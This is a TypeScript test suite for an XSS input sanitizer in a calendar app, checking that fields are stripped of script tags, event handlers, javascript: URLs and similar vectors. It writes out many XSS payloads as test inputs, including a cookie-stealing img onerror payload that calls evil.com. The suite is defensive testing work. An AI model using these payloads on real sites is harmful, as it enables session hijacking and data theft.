/**
 * Security tests for input sanitization utility.
 *
 * These tests verify that the sanitization functions properly
 * neutralize XSS attacks and enforce security constraints.
 *
 * @module input-sanitizer.test
 */

import { describe, it, expect } from 'vitest';
import {
  sanitizeInput,
  sanitizeInputArray,
  isInputSafe,
  containsDangerousContent,
  sanitizeCalendarItem,
  testXSSPrevention,
  XSS_TEST_VECTORS,
  SANITIZATION_LIMITS,
  type SanitizationType,
} from '../input-sanitizer';

describe('Input Sanitization - Security Tests', () => {
  describe('sanitizeInput', () => {
    describe('XSS Prevention - Script Tags', () => {
      it('should remove script tags', () => {
        const input = '<script>alert("XSS")</script>Hello';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Hello');
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('</script>');
      });

      it('should remove mixed case script tags', () => {
        const input = '<ScRiPt>alert(1)</ScRiPt>Test';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Test');
        expect(result.toLowerCase()).not.toContain('script');
      });

      it('should remove script tags with attributes', () => {
        const input = '<script src="evil.js" type="text/javascript">alert(1)</script>Content';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('Content');
        expect(result).not.toContain('src=');
        expect(result).not.toContain('evil.js');
      });

      it('should remove multiple script tags', () => {
        const input = '<script>alert(1)</script>Content<script>alert(2)</script>';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('Content');
        expect(result).not.toContain('<script>');
      });
    });

    describe('XSS Prevention - Event Handlers', () => {
      it('should remove onclick handlers', () => {
        const input = '<div onclick="alert(1)">Click me</div>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onclick');
        expect(result).not.toContain('alert');
      });

      it('should remove onerror handlers', () => {
        const input = '<img src=x onerror="alert(1)">';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('alert');
      });

      it('should remove onload handlers', () => {
        const input = '<body onload=alert(1)>Content</body>';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('Content');
        expect(result).not.toContain('onload');
      });

      it('should remove onmouseover handlers', () => {
        const input = '<a onmouseover="alert(1)">Hover</a>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onmouseover');
      });

      it('should remove event handlers with single quotes', () => {
        const input = "<div onclick='alert(1)'>Test</div>";
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onclick');
      });

      it('should remove event handlers without quotes', () => {
        const input = '<img src=x onerror=alert(1)>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onerror');
        expect(result).not.toContain('alert');
      });
    });

    describe('XSS Prevention - JavaScript Protocol', () => {
      it('should remove javascript: protocol in href', () => {
        const input = '<a href="javascript:alert(1)">Click</a>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('alert');
      });

      it('should remove javascript: protocol variations', () => {
        const input = '<a href=javascript:alert(1)>Click</a>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('javascript:');
      });

      it('should remove javascript: with mixed case', () => {
        const input = '<a href=JaVaScRiPt:alert(1)>Click</a>';
        const result = sanitizeInput(input, 'description');
        expect(result.toLowerCase()).not.toContain('javascript:');
      });
    });

    describe('XSS Prevention - CSS Expressions', () => {
      it('should remove CSS expressions', () => {
        const input = '<div style="width: expression(alert(1))">Test</div>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('expression');
        expect(result).not.toContain('alert');
      });
    });

    describe('XSS Prevention - Data URLs', () => {
      it('should remove dangerous data URLs', () => {
        const input = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('data:text/html');
        expect(result).not.toContain('<script>');
      });
    });

    describe('XSS Prevention - Null Byte Injection', () => {
      it('should remove null bytes', () => {
        const input = 'test\x00injection';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('testinjection');
        expect(result).not.toContain('\x00');
      });

      it('should remove multiple null bytes', () => {
        const input = 'test\x00\x00injection';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('testinjection');
      });
    });

    describe('XSS Prevention - SVG-based', () => {
      it('should remove SVG with onload', () => {
        const input = '<svg onload=alert(1)>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('onload');
      });
    });

    describe('XSS Prevention - Iframe-based', () => {
      it('should remove iframe with javascript src', () => {
        const input = '<iframe src="javascript:alert(1)"></iframe>';
        const result = sanitizeInput(input, 'description');
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('iframe');
      });
    });

    describe('HTML Tag Removal', () => {
      it('should remove all HTML tags', () => {
        const input = '<p>Hello</p><br/><div>World</div>';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('HelloWorld');
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
      });

      it('should remove self-closing tags', () => {
        const input = 'Test<br/>Content';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('TestContent');
      });

      it('should remove malformed tags', () => {
        const input = 'Test<div>Content';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('TestContent');
      });
    });

    describe('Length Limits', () => {
      it('should enforce title length limit', () => {
        const longInput = 'A'.repeat(SANITIZATION_LIMITS.title + 10);
        const result = sanitizeInput(longInput, 'title');
        expect(result.length).toBe(SANITIZATION_LIMITS.title);
      });

      it('should enforce description length limit', () => {
        const longInput = 'A'.repeat(SANITIZATION_LIMITS.description + 100);
        const result = sanitizeInput(longInput, 'description');
        expect(result.length).toBe(SANITIZATION_LIMITS.description);
      });

      it('should enforce tag length limit', () => {
        const longInput = 'A'.repeat(SANITIZATION_LIMITS.tag + 10);
        const result = sanitizeInput(longInput, 'tag');
        expect(result.length).toBe(SANITIZATION_LIMITS.tag);
      });

      it('should enforce assignee length limit', () => {
        const longInput = 'A'.repeat(SANITIZATION_LIMITS.assignee + 10);
        const result = sanitizeInput(longInput, 'assignee');
        expect(result.length).toBe(SANITIZATION_LIMITS.assignee);
      });
    });

    describe('Whitespace Handling', () => {
      it('should trim leading whitespace', () => {
        const input = '   Test';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Test');
      });

      it('should trim trailing whitespace', () => {
        const input = 'Test   ';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Test');
      });

      it('should trim both leading and trailing whitespace', () => {
        const input = '   Test   ';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Test');
      });
    });

    describe('Edge Cases', () => {
      it('should handle empty string', () => {
        const result = sanitizeInput('', 'title');
        expect(result).toBe('');
      });

      it('should handle null input', () => {
        const result = sanitizeInput(null as unknown as string, 'title');
        expect(result).toBe('');
      });

      it('should handle undefined input', () => {
        const result = sanitizeInput(undefined as unknown as string, 'title');
        expect(result).toBe('');
      });

      it('should handle number input', () => {
        const result = sanitizeInput(123 as unknown as string, 'title');
        expect(result).toBe('');
      });

      it('should handle object input', () => {
        const result = sanitizeInput({} as unknown as string, 'title');
        expect(result).toBe('');
      });

      it('should handle string with only whitespace', () => {
        const result = sanitizeInput('   ', 'title');
        expect(result).toBe('');
      });
    });

    describe('Safe Content Preservation', () => {
      it('should preserve safe text', () => {
        const input = 'Hello World';
        const result = sanitizeInput(input, 'title');
        expect(result).toBe('Hello World');
      });

      it('should preserve safe punctuation', () => {
        const input = 'Hello, World! How are you?';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('Hello, World! How are you?');
      });

      it('should preserve safe special characters', () => {
        const input = 'Email: test@example.com, Phone: +1-555-0123';
        const result = sanitizeInput(input, 'description');
        expect(result).toBe('Email: test@example.com, Phone: +1-555-0123');
      });

      it('should preserve newlines and tabs in description', () => {
        const input = 'Line 1\nLine 2\tTabbed';
        const result = sanitizeInput(input, 'description');
        expect(result).toContain('Line 1');
        expect(result).toContain('Line 2');
      });
    });
  });

  describe('sanitizeInputArray', () => {
    it('should sanitize array of strings', () => {
      const input = ['<script>tag1</script>', 'tag2', '<b>tag3</b>'];
      const result = sanitizeInputArray(input, 'tag');
      expect(result).toEqual(['tag1', 'tag2', 'tag3']);
    });

    it('should filter out empty strings after sanitization', () => {
      const input = ['<script></script>', 'valid', '   '];
      const result = sanitizeInputArray(input, 'tag');
      expect(result).toEqual(['valid']);
    });

    it('should handle empty array', () => {
      const result = sanitizeInputArray([], 'tag');
      expect(result).toEqual([]);
    });

    it('should handle non-string items', () => {
      const input = ['tag1', 123, null, undefined, 'tag2'] as unknown as string[];
      const result = sanitizeInputArray(input, 'tag');
      expect(result).toEqual(['tag1', 'tag2']);
    });

    it('should handle non-array input', () => {
      const result = sanitizeInputArray(null as unknown as string[], 'tag');
      expect(result).toEqual([]);
    });

    it('should remove XSS from tag array', () => {
      const input = ['safe', '<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
      const result = sanitizeInputArray(input, 'tag');
      expect(result).toEqual(['safe']);
      expect(result.every((tag) => !containsDangerousContent(tag))).toBe(true);
    });
  });

  describe('isInputSafe', () => {
    it('should return true for safe alphanumeric input', () => {
      const result = isInputSafe('HelloWorld123', /^[a-zA-Z0-9]+$/);
      expect(result).toBe(true);
    });

    it('should return false for input with special characters', () => {
      const result = isInputSafe('Hello World!', /^[a-zA-Z0-9]+$/);
      expect(result).toBe(false);
    });

    it('should return false for XSS attempts', () => {
      const result = isInputSafe('<script>alert(1)</script>', /^[a-zA-Z0-9\s]+$/);
      expect(result).toBe(false);
    });

    it('should return true for safe input with allowed special chars', () => {
      const result = isInputSafe('Hello, World!', /^[a-zA-Z0-9\s,!]+$/);
      expect(result).toBe(true);
    });
  });

  describe('containsDangerousContent', () => {
    it('should detect script tags', () => {
      const result = containsDangerousContent('<script>alert(1)</script>');
      expect(result).toBe(true);
    });

    it('should detect event handlers', () => {
      const result = containsDangerousContent('<div onclick="alert(1)">');
      expect(result).toBe(true);
    });

    it('should detect javascript: protocol', () => {
      const result = containsDangerousContent('<a href="javascript:alert(1)">');
      expect(result).toBe(true);
    });

    it('should detect CSS expressions', () => {
      const result = containsDangerousContent('<div style="width: expression(alert(1))">');
      expect(result).toBe(true);
    });

    it('should detect null bytes', () => {
      const result = containsDangerousContent('test\x00injection');
      expect(result).toBe(true);
    });

    it('should return false for safe content', () => {
      const result = containsDangerousContent('Hello, World!');
      expect(result).toBe(false);
    });

    it('should return false for empty string', () => {
      const result = containsDangerousContent('');
      expect(result).toBe(false);
    });

    it('should handle non-string input', () => {
      const result = containsDangerousContent(null as unknown as string);
      expect(result).toBe(false);
    });
  });

  describe('sanitizeCalendarItem', () => {
    it('should sanitize title field', () => {
      const item = {
        title: '<script>XSS</script>Event Title',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.title).toBe('Event Title');
    });

    it('should sanitize description field', () => {
      const item = {
        description: '<img src=x onerror=alert(1)>Description',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.description).toBe('Description');
    });

    it('should sanitize tags array', () => {
      const item = {
        tags: ['<script>tag1</script>', 'tag2', '<b>tag3</b>'],
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.tags).toEqual(['tag1', 'tag2', 'tag3']);
    });

    it('should sanitize assignee field', () => {
      const item = {
        assignee: 'User<script>alert(1)</script>',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.assignee).toBe('User');
    });

    it('should sanitize location field', () => {
      const item = {
        location: '<iframe src="javascript:alert(1)"></iframe>Room A',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.location).toBe('Room A');
    });

    it('should sanitize notes field', () => {
      const item = {
        notes: '<div onclick="alert(1)">Notes here</div>',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.notes).toBe('Notes here');
    });

    it('should preserve non-string fields', () => {
      const date = new Date();
      const item = {
        title: 'Event',
        startDate: date,
        endDate: new Date(date.getTime() + 86400000),
        allDay: true,
        type: 'event',
        status: 'draft',
        source: 'manual',
        priority: 'high',
      };
      const result = sanitizeCalendarItem(item);
      expect(result.startDate).toEqual(date);
      expect(result.allDay).toBe(true);
      expect(result.priority).toBe('high');
    });

    it('should skip system fields (id, createdAt, updatedAt)', () => {
      const item = {
        id: 'test-id',
        createdAt: new Date(),
        updatedAt: new Date(),
        title: 'Event',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.id).toBeUndefined();
      expect(result.createdAt).toBeUndefined();
      expect(result.updatedAt).toBeUndefined();
    });

    it('should handle complex XSS in multiple fields', () => {
      const item = {
        title: '<script>alert("title")</script>Event',
        description: '<img src=x onerror=alert("desc")>Desc',
        tags: ['<b>tag1</b>', '<script>alert("tag")</script>tag2'],
        assignee: '<div onclick="alert("assignee")">User</div>',
        location: '<iframe src="javascript:alert("loc")"></iframe>Room',
        type: 'event',
        status: 'draft',
        source: 'manual',
        startDate: new Date(),
        allDay: true,
      };
      const result = sanitizeCalendarItem(item);
      expect(result.title).toBe('Event');
      expect(result.description).toBe('Desc');
      expect(result.tags).toEqual(['tag1', 'tag2']);
      expect(result.assignee).toBe('User');
      expect(result.location).toBe('Room');
    });
  });

  describe('testXSSPrevention', () => {
    it('should pass all XSS test vectors', () => {
      const result = testXSSPrevention(sanitizeInput);
      expect(result).toBe(true);
    });

    it('should detect script tag removal failure', () => {
      const badSanitizer = (input: string, _type: SanitizationType) => input;
      const result = testXSSPrevention(badSanitizer);
      expect(result).toBe(false);
    });

    it('should detect event handler removal failure', () => {
      const badSanitizer = (input: string, type: SanitizationType) => {
        // Only remove script tags, not event handlers
        return input.replace(/<script.*?>.*?<\/script>/gi, '');
      };
      const result = testXSSPrevention(badSanitizer);
      expect(result).toBe(false);
    });
  });

  describe('Real-World XSS Attack Vectors', () => {
    it('should prevent reflected XSS from query params', () => {
      const input = '<script>alert(document.cookie)</script>';
      const result = sanitizeInput(input, 'title');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });

    it('should prevent stored XSS in user profiles', () => {
      const input = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">';
      const result = sanitizeInput(input, 'description');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('fetch');
      expect(result).not.toContain('evil.com');
    });

    it('should prevent DOM-based XSS', () => {
      const input = '<div onmouseover="alert(1)">Hover me</div>';
      const result = sanitizeInput(input, 'description');
      expect(result).not.toContain('onmouseover');
    });

    it('should prevent XSS via data attributes', () => {
      const input = '<div data-x="javascript:alert(1)">Test</div>';
      const result = sanitizeInput(input, 'description');
      expect(result).not.toContain('javascript:');
    });

    it('should prevent XSS in tag input', () => {
      const input = '"><script>alert(1)</script><tag="';
      const result = sanitizeInput(input, 'tag');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
    });
  });

  describe('Performance and Stress Tests', () => {
    it('should handle very long input without crashing', () => {
      const longInput = 'A'.repeat(1000000);
      const result = sanitizeInput(longInput, 'description');
      expect(result.length).toBe(SANITIZATION_LIMITS.description);
    });

    it('should handle input with many script tags', () => {
      const input = '<script>alert(1)</script>'.repeat(1000);
      const result = sanitizeInput(input, 'description');
      expect(result).not.toContain('<script>');
    });

    it('should handle input with mixed dangerous and safe content', () => {
      const input = 'Safe text <script>alert(1)</script> more safe <img src=x onerror="xss()"> end';
      const result = sanitizeInput(input, 'description');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('onerror');
      expect(result).toContain('Safe text');
      expect(result).toContain('more safe');
      expect(result).toContain('end');
    });
  });

  describe('Internationalization and Unicode', () => {
    it('should preserve Unicode characters', () => {
      const input = 'Hello 世界 🌍';
      const result = sanitizeInput(input, 'title');
      expect(result).toBe('Hello 世界 🌍');
    });

    it('should preserve emojis', () => {
      const input = 'Event 🎉 Celebration 🎊';
      const result = sanitizeInput(input, 'title');
      expect(result).toBe('Event 🎉 Celebration 🎊');
    });

    it('should preserve RTL text', () => {
      const input = 'مرحبا بالعالم';
      const result = sanitizeInput(input, 'title');
      expect(result).toBe('مرحبا بالعالم');
    });

    it('should strip XSS with Unicode content', () => {
      const input = '<script>alert("XSS")</script>🎉 Event 🎉';
      const result = sanitizeInput(input, 'title');
      expect(result).not.toContain('<script>');
      expect(result).toContain('🎉 Event 🎉');
    });
  });
});
